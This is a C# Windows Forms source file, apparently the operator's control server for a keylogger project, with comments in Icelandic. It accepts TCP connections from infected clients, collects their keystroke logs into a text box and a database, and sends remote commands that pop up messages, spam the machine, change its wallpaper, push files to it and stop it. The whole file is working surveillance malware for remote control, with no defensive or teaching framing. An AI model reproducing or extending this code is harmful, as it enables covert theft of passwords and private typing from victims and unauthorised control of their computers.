using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Timers;
using Timer = System.Timers.Timer;
using System.Net;
using System.Net.Sockets;
using System.Threading;


namespace ForKeyLoggerProject
{
    
    public partial class Main : Form
    {
        
        int port;
        int online = 0;
        int fileportnumber;
        Thread listenerThread;
        TcpListener listener;
        string file;
        static string usernambes = null;
        public static string ipaddress1;

        public static Timer aTimer = new Timer(10000);
        List<string> copy = new List<string>();
        ListViewItem copy1 = new ListViewItem();
        public DateTime now = DateTime.Now;
        public bool klogscollected = false;
        public bool upploaddatatodbautomatic = false;
        public string loggggsss;
        Ggrunntenging.ggrunnur gagnagrunnur = new Ggrunntenging.ggrunnur();

        public Main()
        {
            InitializeComponent();
            Thread starter3 = new Thread(Starting3);
            starter3.Start();
        }
        public void Starting3() 
        {
            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            aTimer.Enabled = true;
        }
 
        public void OnTimedEvent(object sender, EventArgs e)
        {
            string[] items = new string[] { lstBoxUsers.Items.Count + 1.ToString()};

            if (lstBoxUsers.InvokeRequired)
            {
                lstBoxUsers.Invoke((MethodInvoker)delegate ()
                {
                    foreach (ListViewItem item in lstBoxUsers.Items)
                    {
                        Connection client = (Connection)item.Tag;
                        client.Send("CONNECTSTATUS|");
                        DateTime now = DateTime.Now;
                        lbllastupdate.Text = "Last Broadcast: " + now.ToString("MM-dd-HH:mm:ss");

                    }

                });
            }
            aTimer.Stop();
            aTimer.Start();
        }
        /*
        delegate void SetTextCallback(string text);
        
        private void SetText(string text)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.lstBoxUsers.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetText);
                this.Invoke(d, new object[] { text });
                foreach (ListViewItem item in lstBoxUsers.Items)
                {
                    Connection client = (Connection)item.Tag;
                    client.Send("CONNECTSTATUS|");
                }
            }
            else
            {
                
            }
        }
        */

        private void btnListen_Click(object sender, EventArgs e) //listen takkinn
        {
            port = int.Parse(txtPort.Text); // portnumerið úr textbox
            btnListen.Enabled = false;
            listener = new TcpListener(IPAddress.Any, port);
            listenerThread = new Thread(Listen);
            listenerThread.Start();
        }
        
        void Listen()//hérna byrjar serverinn að hlusta
        {
            listener.Start(); 
            while (true)
            {
                try {
                    Connection clientConnection = new Connection(listener.AcceptTcpClient());
                    clientConnection.DisconnectedEvent += new Connection.Disconnected(clientConnection_DisconnectedEvent);
                    clientConnection.ReceivedEvent += new Connection.Received(clientConnection_ReceivedEvent);
                }
                catch
                {

                }
                
            }
        }

        void clientConnection_ReceivedEvent(Connection client, String Message)
        {
            string[] cut = Message.Split('|');
            switch (cut[0]) //skilaboð sem serverinn getur tekið á móti
            {
                case "CONNECTED":
                    Invoke(new _AddClient(AddClient), client, null);
                    break;
                case "STATUS":
                    Invoke(new _Status(Status), client, cut[1]);
                    break;
                case "USERNAME":
                    Invoke(new _Username(Username), client, cut[1]);
                    break;
                case "LOGS":
                    Invoke(new _Logs(log), client, cut[1]);
                    break;
            }
        }

        delegate void _Logs(Connection client, String log); //tekur á móti keyloggs textanum og setur í textbox
        void log(Connection client, String log)
        {
            klogscollected = true;
            txtBoxKeyLogs.Text = txtBoxKeyLogs.Text + log;
            string hello = "hello".ToString();
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                string[] cut = log.Split('~');
                if (true)
                {
                    txtBoxKeyLogs.Text = txtBoxKeyLogs.Text + cut[1] + "\r\n";
                    loggggsss = cut[1].ToString();
                    if (upploaddatatodbautomatic == true)
                    {
                        string ipnumbre = lstBoxUsers.ToString();
                        string ipnumber;
                        string ipnumber2;
                        string[] cut2 = ipnumbre.Split('{');
                        ipnumber2 = cut2[1];
                        string[] cut3 = ipnumber2.Split('}');
                        ipnumber = cut3[0];

                        string statrus = lstBoxUsers.Items[0].SubItems[1].ToString();
                        string status;
                        string status2;
                        string[] skera = statrus.Split('{');
                        status2 = skera[1];
                        string[] skera2 = status2.Split('}');
                        status = skera2[0];

                        gagnagrunnur.addLog(ipnumber, loggggsss);
                    }
                }
                txtBoxKeyLogs.ScrollBars = ScrollBars.Vertical;
                //lstBoxUsers.Items[0].SubItems[0].ToString()
                /*
                switch (cut[1]) //skilaboð sem serverinn getur tekið á móti
                {
                    //case lstBoxUsers.Items[0].SubItems[1].ToString():
                    if 
                    
                    case hello:
                        Invoke(new _AddClient(AddClient), client, null);
                        break;
                }
                if ((Connection)item.Tag == client)
                {
                    item.SubItems[1].Text = log;
                }*/
            }

        }
        // Hérna er clientunum sem eru ekki tengd hent út
        void clientConnection_DisconnectedEvent(Connection client)
        {
            Invoke(new _RemoveClient(RemoveClient), client);
        }

        private void btnStop_Click(object sender, EventArgs e) //STOP takking sem sendir skilaboð á client um að restartast
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("STOP|");
            }
            btnListen.Enabled = true;
            listener.Stop();
            listenerThread.Abort();
        }

        #region <Invoking>
        delegate void _AddClient(Connection client, String[] info);
        void AddClient(Connection client, String[] info)  //Ip tölurnar, Status og username sett í Listboxið
        {
            ListViewItem item = new ListViewItem();
            item.Text = client.IPAddress;
            //ipaddress1 = client.IPAddress; 
            item.SubItems.Add("Idle");
            item.SubItems.Add(usernambes);
            if (info != null)
                item = new ListViewItem(info);
            item.Tag = client;
            online++;
            lstBoxUsers.Items.Add(item);
            updateOnline();
        }

        delegate void _RemoveClient(Connection client); //þessi classi hendir út user ef hann disconnectar
        void RemoveClient(Connection client)
        {
            foreach (ListViewItem i in lstBoxUsers.Items)
                if ((Connection)i.Tag == client)
                {
                    i.Remove();
                    online--;
                    updateOnline();
                    break;
                }
        }

        // status á clientinum
        delegate void _Status(Connection client, String Status);
        void Status(Connection client, String Status)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
                if ((Connection)item.Tag == client)
                {
                    item.SubItems[1].Text = Status;
                    if (upploaddatatodbautomatic == true)
                    {
                       // gagnagrunnur.statusUpdate(lstBoxUsers.Items[0].SubItems[0].ToString(), lstBoxUsers.Items[0].SubItems[1].ToString());

                    }
                    break; 
                }

        }

        delegate void _Username(Connection client, String Username); //tekur á máti usernameinu og setur það í public preytu
        void Username(Connection client, String Username)
        {
            usernambes = Username;
        }
        void updateOnline()//hve margir eru online label
        {
            lblOnline.Text = "Online: " + online; 
        }
        #endregion


        private void Main_FormClosing(object sender, FormClosingEventArgs e) //ef forritinu er lokað
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("STOP|");
            }
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        //
        //Allt hérna fyrir neðan eru takkar sem senda skilbaoð á client  (og einn save data takki)
        //

        private void btnSendMsg_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("MSGBOX|" + txtBoxMsgCaption.Text + "|" + txtBoxMsg.Text.Replace(Environment.NewLine, "[LINE]"));
            }
        }
        private void btnSpam_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("SPAMMERINO|");
            }
        }

        private void btnGetkeylog_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                txtBoxKeyLogs.Clear();
                Connection client = (Connection)item.Tag;
                client.Send("GETLOGS|");
            }
        }

        private void btnSaveData_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
            {
                saveFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                saveFileDialog1.FilterIndex = 2;
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    StreamWriter writer = new StreamWriter(saveFileDialog1.FileName);
                    writer.Write(txtBoxKeyLogs.Text);
                    writer.Close();
                }
            }
        }

        private void btnChangeBG_Click(object sender, EventArgs e)
        {
            
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                lstBoxUsers.Items[0].SubItems[1].Text = "BG Change: Sent";
                lstBoxUsers.Update();
                client.Send("BGROUNDCHANGE|");
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog1 = new OpenFileDialog())
            {
                int size = -1;
                DialogResult result = openFileDialog1.ShowDialog(); // Show the dialog.
                if (result == DialogResult.OK) // Test result.
                {
                    file = openFileDialog1.FileName;
                    try
                    {
                        string text = File.ReadAllText(file);
                        size = text.Length;
                    }
                    catch (IOException)
                    {
                    }
                }
            }
            panel2.BackColor = Color.Green;
            button2.Enabled = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            fileportnumber = int.Parse(tboxportnumber.Text);
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                lstBoxUsers.Items[0].SubItems[1].Text = "Data: Sent";
                lstBoxUsers.Update();
                ipaddress1 = client.IPAddress;
                client.Send("FILE|" + fileportnumber.ToString());
                SendFile(file);
            }
            btnChangeBG.Enabled = true; 
        }
        public static void SendFile(string fName)
        {
            try
            {
                IPAddress ip = IPAddress.Parse(ipaddress1);
                IPEndPoint end = new IPEndPoint(ip, 2014);
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

                string path = "";
                fName = fName.Replace("\\", "/");
                while (fName.IndexOf("/") > -1)
                {
                    path += fName.Substring(0, fName.IndexOf("/") + 1);
                    fName = fName.Substring(fName.IndexOf("/") + 1);
                }
                byte[] fNameByte = Encoding.ASCII.GetBytes(fName);
                if (fNameByte.Length > 1000)
                {
                    return;
                }
                byte[] fileData = File.ReadAllBytes(path + fName);
                byte[] clientData = new byte[4 + fNameByte.Length + fileData.Length];
                byte[] fNameLen = BitConverter.GetBytes(fNameByte.Length);
                fNameLen.CopyTo(clientData, 0);
                fNameByte.CopyTo(clientData, 4);
                fileData.CopyTo(clientData, 4 + fNameByte.Length);
                sock.Connect(end);
                Thread.Sleep(1000);
                sock.Send(clientData);
                Thread.Sleep(100);
                sock.Close();
            }
            catch (Exception ex)
            {

            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("STOP|");
            }
        }


        public static void errors(string error)
        {
            MessageBox.Show(error.ToString());
            
            
        }
        

        private void button4_Click(object sender, EventArgs e)
        {
            

            try
            {
                foreach (ListViewItem item in lstBoxUsers.Items)
                {
                    //lstBoxUsers.Items[0].SubItems[1].Text = "BG Change: Sent";
                    //lstBoxUsers.Items[0].SubItems[0].ToString()
                    
                    string ipnumbre = lstBoxUsers.ToString();
                    string ipnumber;
                    string ipnumber2;
                    string[] cut = ipnumbre.Split('{');
                    ipnumber2 = cut[1];
                    string[] cut1 = ipnumber2.Split('}');
                    ipnumber = cut1[0];

                    string statrus = lstBoxUsers.Items[0].SubItems[1].ToString();
                    string status;
                    string status2;
                    string[] skera = statrus.Split('{');
                    status2 = skera[1];
                    string[] skera2 = status2.Split('}');
                    status = skera2[0];

                    gagnagrunnur.addLogger(ipnumber); //setur ip töluna inn
                    Thread.Sleep(100);
                    //gagnagrunnur.statusUpdate(lstBoxUsers.Items[0].SubItems[0].ToString(), lstBoxUsers.Items[0].SubItems[1].ToString());
                    Thread.Sleep(100);
                    if (klogscollected == true)
                    {
                        gagnagrunnur.addLog(ipnumber, loggggsss); //setur logg inn
                    }

                    panel1.BackColor = Color.Green;
                    upploaddatatodbautomatic = true;
                }
            }
            catch (Exception)
            {
                panel1.BackColor = Color.Red;

            }
            
            
        }

        private void button5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                //gagnagrunnur.clearActive();
            }
        }
    }
}
